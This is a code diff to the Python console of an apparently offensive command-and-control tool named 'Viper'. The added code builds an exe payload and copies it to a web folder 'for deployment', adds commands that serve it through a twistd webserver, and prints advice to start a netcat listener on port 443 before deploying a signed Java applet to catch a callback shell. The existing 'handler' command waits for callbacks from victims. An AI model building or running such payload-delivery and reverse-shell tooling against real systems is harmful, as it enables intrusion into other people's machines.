@@ -34,6 +34,8 @@ def banner():
 #     \_/ |___|_| |___|_|_\  |_| |_|_\/_/ \_\_|  |_|___| \_/\_/ \___/|_|_\_|\_\ |_     _| #
 #                                                                                 |_|_|   #
                     Going low and slow
+
+$ Viper>> help for help
 """
 
 def menu():
@@ -41,10 +43,10 @@ def menu():
     print "[*] Command options: "
     print
     print "[*] handler ========= > starts the viper server and waits for a call back" 
-    print "[*] client2exe ========= > builds a exe payload and stores it inside payloads"
-    print "[*] teamserver ========= > starts the team server protocol and console" 
-    print "[*] ??????? ========= > " 
-    print "[*] ??????? ========= > " 
+    print "[*] client2exe ========= > builds a exe payload and stores it inside payloads and www/html for deployment"
+    print "[*] teamserver ,chat server, chat stop  ========= > starts the team server, chat factory and console : todo" 
+    print "[*] startweb ========= > starts the webserver" 
+    print "[*] stopweb ========= > stops the webserver" 
     print "[*] ??????? ========= > " 
     print "\n"
 
@@ -88,7 +90,7 @@ def console():
         elif 'client2exe' in command:
             #subprocess.call("payloads/Client2exe.sh", stdin=None, stdout=None, stderr=None, shell=True)
             subprocess.call("payloads/Client2exe.sh 2>/dev/null", shell=True)
-            print ( "[+] created the exe inside the payloads folder. Reminder you still may have a payload in /var/www/html")
+            print ( "[+] created the exe inside the payloads folder && copied payload to www/html")
             pass
             #banner()           
             #menu()
@@ -106,7 +108,26 @@ def console():
         elif 'stopchat' in command:
             print ( "[+] for now you will have to manually stop chatserver with the usual methods")
             print ( "[+] type in terminal ps aux | grep chatserver and then kill -9 pid")
-            pass            
+            pass
+            
+        elif 'startweb' in command:
+        		os.chdir("www/")
+        		os.system("twistd web --path html/.")
+        		os.chdir("../")
+        		print "[*] - Starting the webserver reactor"
+        		print "[*] - The webserver is listening on 127.0.0.1:8080"
+        		print "[*] - The reactor is running"
+        		print "[*] - If you deploy the java signed applet then start netcat listener first with nc -lvp 443"
+        		pass   
+            
+        elif 'stopweb' in command:
+        		os.chdir("www/")
+        		os.system("kill `cat twistd.pid`")
+        		os.chdir("../")
+        		print "[*] - Stopping the webserver reactor"
+        		print "[*] - The webserver shutting down"
+        		print "[*] - The reactor is stopping"
+        		pass            
         else:
             print('')
 
